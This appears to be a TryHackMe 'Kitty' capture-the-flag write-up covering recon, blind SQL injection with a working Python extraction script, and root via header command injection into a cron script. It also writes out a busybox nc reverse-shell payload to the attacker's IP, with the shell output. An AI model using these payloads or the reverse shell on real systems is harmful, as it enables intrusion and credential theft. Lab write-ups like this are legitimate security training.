# Kitty

---

Platform: Tryhackme

Difficulty: Medium

Initial access: Blind SQL Injection

Privilege escalation: Internal command injection

---

Nmap scan results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/kitty]
└─$ cat nmap.full
# Nmap 7.95 scan initiated Thu Jul 10 09:15:28 2025 as: /usr/lib/nmap/nmap -Pn -O -sC -A -p- --min-rate=3000 -oN nmap.full 10.10.29.16
Nmap scan report for 10.10.29.16
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 53:30:5b:7f:e4:00:72:8c:8a:2c:4b:2b:76:6c:04:9c (RSA)
|   256 34:3c:88:42:62:56:3f:2a:0b:d9:a2:76:f8:17:ca:32 (ECDSA)
|_  256 15:db:49:ae:fc:65:12:ed:97:2d:01:1a:d1:68:a4:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Openssh 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
- Port 80: Apache httpd 2.4.41 ((Ubuntu))

---

### Port 80:

url: `http://10.10.75.218`

![image.png](image.png)

There’s a login page, we can try for weak user:pass combinations here like admin:password, admin:admin but nothing worked!

![image.png](image%201.png)

We can try to register here with any username: pass . I used hello:pass123

![image.png](image%202.png)

There’s nothing inside even after registering, this site is still in development.

![image.png](image%203.png)

We can try for sql injection on the login page: payload = `hello’ OR 1=1— -`

![image.png](image%204.png)

![image.png](image%205.png)

There’s maybe some mechanism which is detecting our this sql payload. Let’s try different payload. 

payload: `hello’ AND 1=1— -`

![image.png](image%206.png)

Ok, now it worked, so that lesson comes from tib3rius’s tryhackme room “Lesson Learned?”, where he tried to demonstrate that why `' OR 1=1— -` can cause disasters. You can check that room yourself.

[Lesson Learned?](https://tryhackme.com/room/lessonlearned)

---

### Exploiting Blind SQL Injection

So, this application contains blind sqli, we can try different payload for blind sqli, and will try to obtain database name then table_name then username and then moving on to lastly password.

I am going to try mysql’s payload first as it is the most common one.

We can try UNION attack here to determine the no. of colums firstly, then will adjust our query according to that.

```bash
' UNION SELECT 1-- -
```

increase it one by one like `' UNION SELECT 1-- -` then `' UNION SELECT 1,2-- -` till we bypass that login page.

![image.png](image%207.png)

so, 4 is the lucky no. here, let’s make our query according to these.

So, we have to use a python script to enumerate every character of databse-name, table, username and password.

```bash
#!/usr/bin/python3
import requests

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-=+[]{}:;<>,./?| '
url = 'http://10.10.50.107/index.php'
headers = {
    'Host': '10.10.50.107',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.50.107',
    'Connection': 'close',
    'Referer': 'http://10.10.50.107/index.php',
    'Upgrade-Insecure-Requests': '1'
}
database_name = ''
table_name = ''
username = ''
password = ''

state = 1
while state < 5:
    for char in characters:
        if state == 1:
            query = f"' UNION SELECT 1,2,3,4 where database() like '{database_name+char}%'-- -"
        elif state == 2:
            query = f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = '{database_name}' and table_name like '{table_name+char}%'-- -"
        elif state == 3:
            query = f"' UNION SELECT 1,2,3,4 from {table_name} where username like '{username+char}%' and username != 'hello'-- -"
        elif state == 4:
            query = f"' UNION SELECT 1,2,3,4 from {table_name} where username = '{username}' and  password like BINARY'{password+char}%'-- -"

        data = {
            'username': query,
            'password': 'abc'
        }

        response = requests.post(url, headers=headers, data=data, allow_redirects=True)

        if 'Hello there!' in response.text:
            if state == 1:
                database_name += char
            elif state == 2:
                table_name += char
            elif state == 3:
                username += char
            elif state == 4:
                password += char
            break

        if char == characters[-1]:
            print('\033[K')
            if state == 1:
                print(f"Database name\t: {database_name}")
            elif state == 2:
                print(f"Table name\t: {table_name}")
            elif state == 3:
                print(f"Username\t: {username}")
            elif state == 4:
                print(f"Password\t: {password}")
            state = state + 1

        if char != "\n":
            if state == 1:
                print(f"Database name\t: {database_name+char}", end='\r')
            elif state == 2:
                print(f"Table name\t: {table_name+char}", end='\r')
            elif state == 3:
                print(f"Username\t: {username+char}", end='\r')
            elif state == 4:
                print(f"Password\t: {password+char}", end='\r')
```

This script performs **automated blind SQL injection** to extract:

1. **Database name**
2. **Table name**
3. **Username**
4. **Password**

It does this by:

- Sending crafted `username` inputs in a POST request.
- Checking for a success keyword (`"Hello there!"`) in the response.
- Guessing each character one-by-one using SQL `LIKE` conditions.
- Moving to the next stage (`state`) after completing each value.

It loops until it builds all values character-by-character from scratch — without needing any prior knowledge of the database structure.

Results are crazy, when we run this script:

```bash
┌──(ghost㉿kali)-[~/tryhackme/kitty]
└─$ python3 all_enum.py  

Database name   : mywebsite

Table name      : siteusers

Username        : kitty

Password        : L0ng_Liv3_KittY
```

Now, we can try these password to log in to ssh.

---

### USER FLAG

As we can log into user kitty’s account via ssh, next we can try to grab user flag.

```bash
┌──(ghost㉿kali)-[~/tryhackme/kitty]
└─$ ssh kitty@10.10.50.107                                                                             
The authenticity of host '10.10.50.107 (10.10.50.107)' can't be established.
ED25519 key fingerprint is SHA256:8bW5l3Q3fX7WsAT+VCE8SOPQByjEhQujzTgQqajmGE0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.50.107' (ED25519) to the list of known hosts.
kitty@10.10.50.107's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
.....
Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@ip-10-10-50-107:~$ id
uid=1000(kitty) gid=1000(kitty) groups=1000(kitty)
kitty@ip-10-10-50-107:~$ ls
user.txt
kitty@ip-10-10-50-107:~$ cat user.txt
THM{31e606998.......REDACTED}
```

---

### ROOT FLAG

While enumerating, we used pspy64 and saw that a cronjob is running in background, which executes the script `/opt/log_checker.sh` as root.

![image.png](image%208.png)

Have a look at that script.

```bash
kitty@ip-10-10-50-107:~$ cd /opt
kitty@ip-10-10-50-107:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Feb 25  2023 .
drwxr-xr-x 19 root root 4096 Jul 12 09:43 ..
-rw-r--r--  1 root root  152 Feb 25  2023 log_checker.sh
kitty@ip-10-10-50-107:/opt$ cat log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

what that script does?

- **`while read ip; do ... done`**: Loops through each line (IP address) in `/var/www/development/logged`.
- **`/usr/bin/sh -c "echo $ip >> /root/logged"`:**
    - For each IP, it spawns a new shell using `/usr/bin/sh` .So, if we are able to control IP, we should be able to execute commands via command injection.
    - Appends the IP to `/root/logged`
- Clears the original file by redirecting `/dev/null` (empty) to it.

Let’s have a look at /var/www/development directory:

```bash
kitty@ip-10-10-50-107:/var/www/development$ ls -la
total 32
drwxr-xr-x 2 root     root     4096 Nov 15  2022 .
drwxr-xr-x 4 root     root     4096 Nov 15  2022 ..
-rw-r--r-- 1 root     root      493 Nov 15  2022 config.php
-rw-r--r-- 1 root     root     2843 Nov 15  2022 index.php
-rw-r--r-- 1 www-data www-data    0 Jul 12 10:56 logged
-rw-r--r-- 1 root     root      223 Nov 15  2022 logout.php
-rw-r--r-- 1 root     root     5332 Nov 15  2022 register.php
-rw-r--r-- 1 root     root      860 Nov 15  2022 welcome.php
```

Check index.php:

![image.png](image%209.png)

It is getting IP via ‘http-x-forwarded’ header, that means we can control it and will inject our commands too.

But, first of all let’s check if it’s running on the same 80 port or somewhere else:

![image.png](image%2010.png)

Our doubt was correct, as we can see an instance running on port 8080 locally(127.0.0.1).

To confirm we can check out it’s config page and see it’s documentRoot is at /var/www/development.

![image.png](image%2011.png)

Now, we can make curl request internally to port 8080 with custom headers and check our attack.

```bash
kitty@ip-10-10-50-107:/var/www/development$ curl -X POST \
> -H "Content-Type: application/x-www-form-urlencoded" \
> -H "X-Forwarded-For: test" \
> -d "username=0xi&password=asdasd" \
> http://127.0.0.1:8080/index.php

SQL Injection detected. This incident will be logged!
kitty@ip-10-10-50-107:/var/www/development$ cat logged
test
```

As we put any dangerous character in username and it logs that request’s ip from X-Forwarded-For header.

Now, we can put reverse shell there in header and will get root shell back to our machine.

```bash
kitty@ip-10-10-50-107:/var/www/development$ curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: \$(busybox nc 10.17.87.131 4445 -e /bin/bash)" \
> -d "username=0xi&password=asdasd" \
> http://127.0.0.1:8080/index.php

SQL Injection detected. This incident will be logged!kitty@ip-10-10-50-107:/var/www/development$ cat logged
$(busybox nc 10.17.87.131 4445 -e /bin/bash)
```

We should get our reverse shell back on our nc listner:

```bash
┌──(ghost㉿kali)-[~/tryhackme/kitty]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.50.107] 56272
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls -la
total 40
drwx------  5 root root 4096 Jul 12 11:14 .
drwxr-xr-x 19 root root 4096 Jul 12 09:43 ..
lrwxrwxrwx  1 root root    9 Nov 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Nov  8  2022 .cache
-rw-r--r--  1 root root    5 Jul 12 11:14 logged
lrwxrwxrwx  1 root root    9 Nov 15  2022 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   38 Nov 15  2022 root.txt
-rw-r--r--  1 root root   75 Nov 15  2022 .selected_editor
drwx------  3 root root 4096 Nov  8  2022 snap
drwx------  2 root root 4096 Nov  8  2022 .ssh
-rw-------  1 root root    0 Feb 25  2023 .viminfo
cat root.txt
THM{581bfc2.......REDACTED}
```

And we are root now!

---

That’s it for this machine.✅